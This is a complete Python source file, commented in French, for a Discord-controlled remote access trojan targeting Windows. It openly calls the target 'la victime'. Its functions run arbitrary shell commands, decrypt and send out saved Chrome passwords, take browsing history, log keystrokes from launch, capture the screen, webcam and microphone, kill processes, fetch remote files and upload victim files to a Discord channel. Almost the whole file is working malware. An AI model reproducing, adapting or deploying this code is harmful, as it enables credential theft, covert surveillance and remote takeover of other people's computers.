import discord
import platform
import psutil
import subprocess
import os
import random
import string
import json
import base64
import sqlite3
import shutil
import win32crypt
import requests
from Crypto.Cipher import AES
from PIL import ImageGrab  # Pour prendre un screenshot
import io  # Pour manipuler l'image en mémoire
import pynput  # Pour enregistrer les frappes clavier
import threading  # Pour exécuter le keylogger en parallèle
import pyaudio  # Pour capturer l'audio du micro
import cv2  # Pour capturer des images avec la webcam
import GPUtil  # Pour récupérer les informations GPU

# Variables pour Discord
DISCORD_BOT_TOKEN = 'ton token de bot discord'  # Remplace par ton token Discord

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# Stocker le répertoire de travail actuel
current_directory = os.getcwd()

# Créer un répertoire temporaire avec un nom aléatoire dans %TEMP%
temp_dir = os.path.join(os.environ['TEMP'], ''.join(random.choices(string.ascii_letters + string.digits, k=10)))
os.makedirs(temp_dir, exist_ok=True)

# Lorsque le bot se connecte
@client.event
async def on_ready():
    print(f'Bot connecté en tant que {client.user}')

    # Vérifier si le bot est dans un serveur et créer un canal
    if client.guilds:
        guild = client.guilds[0]  # Prendre le premier serveur
        new_channel = await create_random_channel(guild)
        await new_channel.send("Bot actif ! Faites !help pour voir les commandes disponibles !")

# Fonction pour créer un canal aléatoire
async def create_random_channel(guild):
    # Générer un nom de canal aléatoire
    channel_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    
    # Crée un canal textuel avec ce nom
    new_channel = await guild.create_text_channel(channel_name)
    return new_channel

# Lorsque le bot reçoit un message
@client.event
async def on_message(message):
    global current_directory  # Utilisation de la variable globale pour stocker le répertoire actuel

    if message.author == client.user:
        return  # Ignore les messages envoyés par le bot lui-même

    # Commande !help
    if message.content.startswith('!help'):
        help_text = """
    **Commandes disponibles**:
    - `!help` : Affiche cette aide.
    - `!sysinfo` : Affiche les informations système.
    - `!cmd <commande>` : Exécute une commande système.
    - `!cmd cd <directory>` : Change le répertoire de travail.
    - `!grab_passwd` : Récupère les mots de passe enregistrés dans Chrome et les envoie.
    - `!screen` : Capture une capture d'écran et l'envoie.
    - `!screen_cam` : Capture une image via la webcam et l'envoie.
    - `!history` : Affiche l'historique de navigation de Chrome.
    - `!key_logger` : Enregistre les frappes clavier et les envoie.
    - `!mic_stream` : Crée un salon vocal et connecte le bot.
    - `!process` : Affiche tous les processus en cours d'utilisation.
    - `!kill_process <nom du processus>` : Tue un processus.
    - `!open_process <nom du processus>` : Ouvre un processus.
    - `!upload <url> <save_path>` : Télécharge un fichier depuis une URL et le sauvegarde.
    - `!download <file_path>` : Télécharge un fichier depuis l'ordinateur de la victime.
    """
        await message.channel.send(help_text)

    # Commande !sysinfo
    if message.content.startswith('!sysinfo'):
        sys_info = get_system_info()
        await message.channel.send(sys_info)

    # Commande !cmd
    if message.content.startswith('!cmd'):
        cmd = message.content[len('!cmd '):]
        if cmd.startswith('cd '):
            new_directory = cmd[3:].strip()
            if os.path.isdir(new_directory):
                current_directory = new_directory
                await message.channel.send(f"Répertoire de travail changé : {current_directory}")
            else:
                await message.channel.send(f"Le répertoire spécifié n'existe pas : {new_directory}")
        else:
            output = execute_command(cmd)
            await message.channel.send(f"**Sortie de la commande {cmd}:**\n```\n{output}\n```")

    # Commande !grab_passwd
    if message.content.startswith('!grab_passwd'):
        passwords_file = get_chrome_passwords()
        if passwords_file:
            # Envoie les mots de passe récupérés sur Discord
            await send_to_discord(message.channel, passwords_file)
        else:
            await message.channel.send("Aucun mot de passe trouvé ou extraction échouée.")

    # Commande !screen
    if message.content.startswith('!screen'):
        await capture_and_send_screen(message.channel)

    # Commande !screen_cam
    if message.content.startswith('!screen_cam'):
        await capture_and_send_webcam(message.channel)

    # Commande !history
    if message.content.startswith('!history'):
        history_file = get_chrome_history()
        if history_file:
            await send_to_discord(message.channel, history_file)
        else:
            await message.channel.send("Aucun historique trouvé ou récupération échouée.")

    # Commande !key_logger
    if message.content.startswith('!key_logger'):
        await send_keylogger_output(message.channel)

    # Commande !mic_stream
    if message.content.startswith('!mic_stream'):
        await mic_stream(message)

    # Commande !process
    if message.content.startswith('!process'):
        processes_file = list_processes_to_file()
        await send_to_discord(message.channel, processes_file)

    # Commande !kill_process
    if message.content.startswith('!kill_process'):
        process_name = message.content[len('!kill_process '):].strip()
        result = kill_process(process_name)
        await message.channel.send(result)

    # Commande !open_process
    if message.content.startswith('!open_process'):
        process_name = message.content[len('!open_process '):].strip()
        result = open_process(process_name)
        await message.channel.send(result)

    # Commande !upload
    if message.content.startswith('!upload'):
        parts = message.content.split(' ')
        if len(parts) == 3:
            url = parts[1]
            save_path = parts[2]
            await download_file(message.channel, url, save_path)
        else:
            await message.channel.send("Usage: !upload <url> <save_path>")

    # Commande !download
    if message.content.startswith('!download'):
        file_path = message.content[len('!download '):].strip()
        if os.path.isfile(file_path):
            await upload_file(message.channel, file_path)
        else:
            await message.channel.send(f"Fichier non trouvé : {file_path}")

# Fonction pour récupérer les informations système
# Fonction pour récupérer les informations système
def get_system_info():
    uname_info = platform.uname()
    cpu_info = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    disk_info = psutil.disk_usage('/')
    bios_info = platform.uname().version

    # Informations réseau
    hostname = platform.node()
    ip_address = requests.get('https://api.ipify.org').text

    # Informations GPU (si disponible)
    try:
        gpus = GPUtil.getGPUs()
        gpu_info = "\n".join([f"GPU {i}: {gpu.name} - {gpu.load*100:.1f}% utilisé" for i, gpu in enumerate(gpus)])
    except ImportError:
        gpu_info = "GPUtil non installé, informations GPU non disponibles."

    sys_info = f"""
    **Informations système**:
    - Système d'exploitation: {uname_info.system} {uname_info.release} ({uname_info.version})
    - Machine: {uname_info.machine}
    - CPU: {cpu_info}% d'utilisation
    - RAM: {memory_info.percent}% utilisé sur {memory_info.total / (1024 ** 3):.2f} Go
    - Disque: {disk_info.percent}% utilisé sur {disk_info.total / (1024 ** 3):.2f} Go
    - Version du BIOS: {bios_info}
    - Nom d'hôte: {hostname}
    - Adresse IP: {ip_address}
    - Informations GPU: {gpu_info}
    """
    return sys_info

# Fonction pour exécuter une commande système
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return f"Erreur lors de l'exécution de la commande: {str(e)}"

# Fonction pour envoyer le fichier de mots de passe sur Discord
async def send_to_discord(channel, file_path):
    with open(file_path, 'rb') as f:
        # Envoi du fichier via l'API Discord
        file = discord.File(f, filename=os.path.basename(file_path))
        await channel.send(f"Voici le fichier {os.path.basename(file_path)} :", file=file)

# Fonction pour récupérer les mots de passe de Chrome
def get_chrome_passwords():
    chrome_data_path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Default", "Login Data")
    temp_data_path = os.path.join(temp_dir, "Login Data")
    
    if not os.path.exists(chrome_data_path):
        print("Le fichier Login Data de Chrome est introuvable.")
        return None

    # Copier le fichier SQLite pour éviter les conflits d'accès
    shutil.copyfile(chrome_data_path, temp_data_path)
    
    conn = sqlite3.connect(temp_data_path)
    cursor = conn.cursor()
    
    # Requête SQL pour récupérer les logins
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    output_file_path = os.path.join(temp_dir, "passwords.txt")
    
    with open(output_file_path, "w") as output_file:
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]

            # Décryptage du mot de passe
            password = decrypt_password(encrypted_password)

            if username and password:
                output_file.write(f"Site: {origin_url}\nUser: {username}\nPassword: {password}\n\n")
    
    cursor.close()
    conn.close()

    return output_file_path

# Fonction de décryptage des mots de passe
def decrypt_password(encrypted_password):
    try:
        # En cas de mot de passe vide ou non crypté
        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
            # Récupérer la clé de chiffrement
            key = get_encryption_key()
            iv = encrypted_password[3:15]
            password = encrypted_password[15:]
            
            # Décryptage avec AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(password)[:-16].decode()  # Retirer le tag d'authentification
            return decrypted_password
        else:
            # Utilisation des anciennes méthodes de déchiffrement
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except Exception as e:
        print(f"Erreur lors du décryptage du mot de passe : {e}")
        return ""

# Fonction pour récupérer la clé de décryptage
def get_encryption_key():
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state_data = json.loads(file.read())
    
    encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
    
    # Enlever l'en-tête 'DPAPI'
    encrypted_key = encrypted_key[5:]
    
    # Décrypter la clé avec win32crypt
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Fonction pour capturer l'écran et l'envoyer
async def capture_and_send_screen(channel):
    screenshot = ImageGrab.grab()  # Prendre la capture d'écran

    # Sauver la capture d'écran en mémoire
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)

    # Envoyer la capture d'écran sur Discord
    await channel.send(file=discord.File(img_byte_arr, filename="screenshot.png"))

# Fonction pour capturer une image avec la webcam et l'envoyer
async def capture_and_send_webcam(channel):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        img_path = os.path.join(temp_dir, "webcam_capture.png")
        cv2.imwrite(img_path, frame)
        await channel.send(file=discord.File(img_path))
    else:
        await channel.send("Erreur lors de la capture de l'image avec la webcam.")
    cam.release()

# Fonction pour récupérer l'historique de Chrome
def get_chrome_history():
    history_file_path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Default", "History")
    temp_history_path = os.path.join(temp_dir, "History")
    
    if not os.path.exists(history_file_path):
        print("Le fichier d'historique de Chrome est introuvable.")
        return None

    # Copier le fichier SQLite pour éviter les conflits d'accès
    shutil.copyfile(history_file_path, temp_history_path)
    
    conn = sqlite3.connect(temp_history_path)
    cursor = conn.cursor()

    # Requête SQL pour récupérer les URL visitées
    cursor.execute("SELECT url, title, visit_count FROM urls")
    
    output_file_path = os.path.join(temp_dir, "history.txt")
    
    with open(output_file_path, "w", encoding="utf-8") as output_file:  # Utiliser l'encodage UTF-8
        for row in cursor.fetchall():
            url = row[0]
            title = row[1]
            visit_count = row[2]

            output_file.write(f"URL: {url}\nTitre: {title}\nVisites: {visit_count}\n\n")
    
    cursor.close()
    conn.close()

    return output_file_path

# Fonction pour enregistrer les frappes clavier et envoyer les résultats
def start_keylogger():
    def on_press(key):
        try:
            key_pressed = str(key.char)
        except AttributeError:
            key_pressed = str(key)
        
        with open(os.path.join(temp_dir, "keylogs.txt"), "a") as file:
            file.write(key_pressed)

    # Commence à écouter les frappes clavier
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

# Démarrer le keylogger dans un thread
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

# Fonction pour envoyer les logs du keylogger
async def send_keylogger_output(channel):
    with open(os.path.join(temp_dir, "keylogs.txt"), "r") as file:
        keylogs = file.read()
    # Diviser les logs en plusieurs messages si nécessaire
    for i in range(0, len(keylogs), 1990):
        await channel.send(f"Voici les frappes clavier capturées :\n```\n{keylogs[i:i+1990]}\n```")

# Fonction pour créer un salon vocal et y connecter le bot
async def mic_stream(message):
    guild = message.guild

    # Créer un salon vocal avec un nom spécifique si il n'existe pas déjà
    voice_channel_name = "Malware_Stream"
    existing_channel = discord.utils.get(guild.voice_channels, name=voice_channel_name)
    
    if existing_channel:
        voice_channel = existing_channel
    else:
        voice_channel = await guild.create_voice_channel(voice_channel_name)

    # Vérifie si le bot est déjà dans un salon vocal
    if guild.voice_client:
        await guild.voice_client.disconnect()

    # Connecter le bot au salon vocal créé
    voice_client = await voice_channel.connect()

    # Mettre le bot en sourdine (si besoin)
    voice_client.mute = False

    # Capturer l'audio du micro et l'envoyer au salon vocal
    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)

    def callback(in_data, frame_count, time_info, status):
        voice_client.send_audio_packet(in_data)
        return (in_data, pyaudio.paContinue)

    stream.start_stream()

    await message.channel.send(f"Le bot a rejoint le salon vocal {voice_channel_name} et diffuse l'audio du micro.")

# Fonction pour lister tous les processus en cours et les enregistrer dans un fichier
def list_processes_to_file():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        processes.append(proc.info)
    
    output_file_path = os.path.join(temp_dir, "processes.txt")
    with open(output_file_path, "w", encoding="utf-8") as output_file:
        for proc in processes:
            output_file.write(f"PID: {proc['pid']} - Nom: {proc['name']}\n")
    
    return output_file_path

# Fonction pour tuer un processus par nom
def kill_process(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            proc.terminate()
            return f"Processus {process_name} terminé."
    return f"Processus {process_name} non trouvé."

# Fonction pour ouvrir un processus par nom
def open_process(process_name):
    try:
        subprocess.Popen(process_name)
        return f"Processus {process_name} ouvert."
    except Exception as e:
        return f"Erreur lors de l'ouverture du processus {process_name} : {str(e)}"

# Fonction pour télécharger un fichier depuis une URL et le sauvegarder
async def download_file(channel, url, save_path):
    try:
        response = requests.get(url)
        with open(save_path, 'wb') as f:
            f.write(response.content)
        await channel.send(f"Fichier téléchargé et sauvegardé sous : {save_path}")
    except Exception as e:
        await channel.send(f"Erreur lors du téléchargement du fichier : {str(e)}")

# Fonction pour télécharger un fichier depuis l'ordinateur de la victime
async def upload_file(channel, file_path):
    try:
        with open(file_path, 'rb') as f:
            await channel.send(file=discord.File(f, filename=os.path.basename(file_path)))
    except Exception as e:
        await channel.send(f"Erreur lors du téléchargement du fichier : {str(e)}")

# Démarrer le bot
client.run(DISCORD_BOT_TOKEN)
